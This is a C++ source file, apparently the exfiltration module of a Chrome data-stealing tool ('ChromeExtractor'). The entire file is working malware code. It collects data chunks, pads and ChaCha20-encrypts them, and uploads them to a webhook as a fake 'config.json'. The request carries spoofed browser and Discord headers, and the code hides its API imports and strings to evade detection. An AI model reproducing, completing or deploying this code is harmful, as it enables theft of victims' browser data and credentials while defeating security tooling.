#include <windows.h> // FIRST
#include <vector>
#include <string>
#include <cstring>
#include <algorithm>

// Manual defines since we removed bcrypt.h to avoid IAT entries
#define BCRYPT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define BCRYPT_USE_SYSTEM_PREFERRED_RNG 0x00000002
#define BCRYPT_SHA256_ALGORITHM L"SHA256"

#include "exfiltration/obfuscated_exfil.h"
#include "peb_resolve.h" // For IMP() and PebResolve
#include "str_encrypt.h"
#include "crypto/chacha20.h"

using namespace ChromeExtractor::Imports;

namespace ChromeExtractor::Exfil {

    bool ObfuscatedExfiltration::SecureRandom(uint8_t* buf, size_t len) {
        auto pGenRandom = IMP(BCryptGenRandom);
        if (!pGenRandom) return false;
        return BCRYPT_SUCCESS(pGenRandom(
            nullptr, buf, static_cast<ULONG>(len), BCRYPT_USE_SYSTEM_PREFERRED_RNG));
    }

    ObfuscatedExfiltration::ObfuscatedExfiltration() = default;
    ObfuscatedExfiltration::~ObfuscatedExfiltration() {
        Wipe();
    }

    void ObfuscatedExfiltration::Wipe() {
        if (!m_buffer.empty()) {
            SecureZeroMemory(m_buffer.data(), m_buffer.size());
            m_buffer.clear();
            m_buffer.shrink_to_fit();
        }
        if (!m_chunks.empty()) {
            SecureZeroMemory(m_chunks.data(), m_chunks.size() * sizeof(ChunkHeader));
            m_chunks.clear();
        }
        m_initialized = false;
    }

    bool ObfuscatedExfiltration::Initialize(const Config& cfg) {
        if (!cfg.webhookUrl || cfg.webhookUrlLen == 0) return false;
        m_config = cfg;
        if (m_config.maxPayloadBytes == 0) m_config.maxPayloadBytes = 8 * 1024 * 1024;
        m_initialized = true;
        m_buffer.reserve(HEADER_SIZE + 256);
        return true;
    }

    bool ObfuscatedExfiltration::AddChunk(const char* name, const uint8_t* data, size_t len) {
        if (!m_initialized || !name || !data || len == 0) return false;
        uint32_t offset = static_cast<uint32_t>(m_buffer.size());
        if (offset == 0) {
            m_buffer.resize(HEADER_SIZE, 0);
            offset = HEADER_SIZE;
        }
        m_buffer.insert(m_buffer.end(), data, data + len);
        ChunkHeader ch{};
        ch.nameHash = 0x811C9DC5u;
        for (const char* p = name; *p; ++p) {
            ch.nameHash ^= static_cast<uint32_t>(static_cast<unsigned char>(*p));
            ch.nameHash *= 0x01000193u;
        }
        ch.offset = offset;
        ch.length = static_cast<uint32_t>(len);
        m_chunks.push_back(ch);
        return true;
    }

    void ObfuscatedExfiltration::PadBuffer() {
        if (m_buffer.size() >= HEADER_SIZE) {
            memcpy(m_buffer.data() + 0, &MAGIC, 4);
            uint16_t ver = VERSION;
            memcpy(m_buffer.data() + 4, &ver, 2);
            uint16_t cc = static_cast<uint16_t>(m_chunks.size());
            memcpy(m_buffer.data() + 6, &cc, 2);
            uint32_t total = static_cast<uint32_t>(m_buffer.size());
            memcpy(m_buffer.data() + 8, &total, 4);
            uint32_t flags = m_config.useFileUpload ? 0x01 : 0x00;
            memcpy(m_buffer.data() + 12, &flags, 4);
        }
        size_t aligned = (m_buffer.size() + 15) & ~size_t(15);
        uint8_t tailLen = 0;
        SecureRandom(&tailLen, 1);
        tailLen = 16 + (tailLen % 49);
        size_t finalSize = aligned + tailLen;
        if (finalSize > m_config.maxPayloadBytes)
            finalSize = m_config.maxPayloadBytes;
        m_buffer.resize(finalSize, 0);
        if (aligned < finalSize)
            SecureRandom(m_buffer.data() + aligned, finalSize - aligned);
    }

    void ObfuscatedExfiltration::BuildHeaders(
        std::vector<std::pair<std::string, std::string>>& headers)
    {
        // UA strings and header values — all compile-time encrypted; no plaintext in .rdata
        static const std::string uas[] = {
            XSTR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ")
            + XSTR("(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
            XSTR("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) ")
            + XSTR("Gecko/20100101 Firefox/133.0"),
            XSTR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ")
            + XSTR("(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"),
        };
        uint8_t idx = 0;
        SecureRandom(&idx, 1);
        idx %= 3;
        headers.emplace_back(XSTR("User-Agent"),        uas[idx]);
        headers.emplace_back(XSTR("Accept"),            XSTR("*/*"));
        headers.emplace_back(XSTR("Accept-Language"),   XSTR("en-US,en;q=0.9"));
        headers.emplace_back(XSTR("Accept-Encoding"),   XSTR("gzip, deflate, br"));
        headers.emplace_back(XSTR("Origin"),            XSTR("https://discord.com"));
        headers.emplace_back(XSTR("Referer"),           XSTR("https://discord.com/channels/@me"));
        headers.emplace_back(XSTR("Sec-Ch-Ua"),         XSTR("\"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\""));
        headers.emplace_back(XSTR("Sec-Ch-Ua-Mobile"),  XSTR("?0"));
        headers.emplace_back(XSTR("Sec-Ch-Ua-Platform"),XSTR("\"Windows\""));
        headers.emplace_back(XSTR("Sec-Fetch-Dest"),    XSTR("empty"));
        headers.emplace_back(XSTR("Sec-Fetch-Mode"),    XSTR("cors"));
        headers.emplace_back(XSTR("Sec-Fetch-Site"),    XSTR("same-origin"));
    }

    bool ObfuscatedExfiltration::BuildRequestBody(
        const uint8_t* encData, size_t encLen,
        std::vector<uint8_t>& outBuf,
        std::string& contentType,
        std::string& boundary)
    {
        if (m_config.useFileUpload) {
            uint8_t bndBytes[16];
            SecureRandom(bndBytes, sizeof(bndBytes));
            char bndChars[33];
            for (int i = 0; i < 16; i++) {
                static const char hex[] = "0123456789abcdef";
                bndChars[i * 2] = hex[bndBytes[i] >> 4];
                bndChars[i * 2 + 1] = hex[bndBytes[i] & 0xF];
            }
            bndChars[32] = '\0';
            boundary = bndChars;
            std::string partHeader = "--" + boundary + "\r\n"
                "Content-Disposition: form-data; name=\"file\"; filename=\"config.json\"\r\n"
                "Content-Type: application/octet-stream\r\n"
                "\r\n";
            std::string partFooter = "\r\n--" + boundary + "--\r\n";
            outBuf.reserve(partHeader.size() + encLen + partFooter.size());
            outBuf.insert(outBuf.end(), partHeader.begin(), partHeader.end());
            outBuf.insert(outBuf.end(), encData, encData + encLen);
            outBuf.insert(outBuf.end(), partFooter.begin(), partFooter.end());
            contentType = "multipart/form-data; boundary=" + boundary;
        }
        else {
            outBuf.assign(encData, encData + encLen);
            contentType = "application/json";
        }
        return true;
    }

    bool ObfuscatedExfiltration::HttpSend(
        const std::wstring& url,
        const std::vector<uint8_t>& body,
        const std::string& contentType,
        const std::vector<std::pair<std::string, std::string>>& headers)
    {
        auto pWinHttpOpen = IMP(WinHttpOpen);
        auto pWinHttpCrackUrl = IMP(WinHttpCrackUrl);
        auto pWinHttpConnect = IMP(WinHttpConnect);
        auto pWinHttpOpenRequest = IMP(WinHttpOpenRequest);
        auto pWinHttpAddRequestHeaders = IMP(WinHttpAddRequestHeaders);
        auto pWinHttpSendRequest = IMP(WinHttpSendRequest);
        auto pWinHttpReceiveResponse = IMP(WinHttpReceiveResponse);
        auto pWinHttpQueryHeaders = IMP(WinHttpQueryHeaders);
        auto pWinHttpCloseHandle = IMP(WinHttpCloseHandle);

        if (!pWinHttpOpen || !pWinHttpCrackUrl || !pWinHttpConnect ||
            !pWinHttpOpenRequest || !pWinHttpSendRequest || !pWinHttpCloseHandle)
            return false;

        HINTERNET hSession = pWinHttpOpen(
            L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return false;

        URL_COMPONENTS uc{};
        uc.dwStructSize = sizeof(uc);
        wchar_t host[256], path[2048];
        uc.lpszHostName = host; uc.dwHostNameLength = 256;
        uc.lpszUrlPath = path; uc.dwUrlPathLength = 2048;

        if (!pWinHttpCrackUrl(url.c_str(), 0, 0, &uc)) {
            pWinHttpCloseHandle(hSession);
            return false;
        }

        HINTERNET hConnect = pWinHttpConnect(hSession, host, uc.nPort, 0);
        if (!hConnect) { pWinHttpCloseHandle(hSession); return false; }

        DWORD openFlags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
        HINTERNET hRequest = pWinHttpOpenRequest(
            hConnect, L"POST", path, nullptr,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, openFlags);
        if (!hRequest) {
            pWinHttpCloseHandle(hConnect);
            pWinHttpCloseHandle(hSession);
            return false;
        }

        for (const auto& [name, value] : headers) {
            std::wstring wname(name.begin(), name.end());
            std::wstring wval(value.begin(), value.end());
            std::wstring hdr = wname + L": " + wval;
            pWinHttpAddRequestHeaders(hRequest, hdr.c_str(),
                static_cast<DWORD>(hdr.size()),
                WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
        }

        std::wstring wContentType(contentType.begin(), contentType.end());
        BOOL ok = pWinHttpSendRequest(hRequest,
            wContentType.c_str(), static_cast<DWORD>(wContentType.size()),
            const_cast<uint8_t*>(body.data()), static_cast<DWORD>(body.size()),
            static_cast<DWORD>(body.size()), 0);

        if (ok) ok = pWinHttpReceiveResponse(hRequest, nullptr);

        DWORD status = 0;
        DWORD statusSize = sizeof(status);
        if (ok) {
            pWinHttpQueryHeaders(hRequest,
                WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                WINHTTP_HEADER_NAME_BY_INDEX, &status, &statusSize,
                WINHTTP_NO_HEADER_INDEX);
        }

        pWinHttpCloseHandle(hRequest);
        pWinHttpCloseHandle(hConnect);
        pWinHttpCloseHandle(hSession);

        return ok && (status >= 200 && status < 400);
    }

    bool ObfuscatedExfiltration::Send() {
        if (!m_initialized || m_chunks.empty()) return false;

        PadBuffer();

        uint8_t key[32], nonce[12];
        {
            auto pOpenAlg = IMP(BCryptOpenAlgorithmProvider);
            auto pCreateHash = IMP(BCryptCreateHash);
            auto pHashData = IMP(BCryptHashData);
            auto pFinishHash = IMP(BCryptFinishHash);
            auto pDestroyHash = IMP(BCryptDestroyHash);
            auto pCloseAlg = IMP(BCryptCloseAlgorithmProvider);
            auto pQPC = IMP(QueryPerformanceCounter);

            if (!pOpenAlg || !pCreateHash || !pHashData || !pFinishHash || !pDestroyHash || !pCloseAlg || !pQPC)
                return false;

            BCRYPT_ALG_HANDLE hAlg = nullptr;
            BCRYPT_HASH_HANDLE hHash = nullptr;

            if (!BCRYPT_SUCCESS(pOpenAlg(&hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, 0)))
                return false;

            LARGE_INTEGER qpc;
            pQPC(&qpc);

            pCreateHash(hAlg, &hHash, nullptr, 0, nullptr, 0, 0);
            pHashData(hHash, reinterpret_cast<PUCHAR>(const_cast<char*>(m_config.webhookUrl)), static_cast<ULONG>(m_config.webhookUrlLen), 0);
            pHashData(hHash, reinterpret_cast<PUCHAR>(&qpc), sizeof(qpc), 0);

            uint8_t digest[32];
            pFinishHash(hHash, digest, sizeof(digest), 0);
            pDestroyHash(hHash);
            pCloseAlg(hAlg, 0);

            memcpy(key, digest, 32);

            pOpenAlg(&hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, 0);
            pCreateHash(hAlg, &hHash, nullptr, 0, nullptr, 0, 0);
            pHashData(hHash, digest, 32, 0);
            pFinishHash(hHash, digest, sizeof(digest), 0);
            pDestroyHash(hHash);
            pCloseAlg(hAlg, 0);

            memcpy(nonce, digest, 12);
        }

        std::vector<uint8_t> ciphertext(m_buffer.size());
        std::vector<uint8_t> keyVec(key, key + 32);
        std::vector<uint8_t> nonceVec(nonce, nonce + 12);

        ChaCha20 cipher(keyVec, nonceVec);
        if (!cipher.Encrypt(m_buffer, ciphertext)) {
            SecureZeroMemory(key, sizeof(key));
            return false;
        }

        SecureZeroMemory(key, sizeof(key));
        SecureZeroMemory(nonce, sizeof(nonce));

        std::vector<uint8_t> requestBody;
        std::string contentType, boundary;
        if (!BuildRequestBody(ciphertext.data(), ciphertext.size(),
            requestBody, contentType, boundary)) {
            SecureZeroMemory(ciphertext.data(), ciphertext.size());
            return false;
        }

        SecureZeroMemory(ciphertext.data(), ciphertext.size());

        std::vector<std::pair<std::string, std::string>> headers;
        BuildHeaders(headers);

        std::wstring wurl(m_config.webhookUrl,
            m_config.webhookUrl + m_config.webhookUrlLen);

        bool result = HttpSend(wurl, requestBody, contentType, headers);

        SecureZeroMemory(requestBody.data(), requestBody.size());
        Wipe();
        return result;
    }

} // namespace ChromeExtractor::Exfil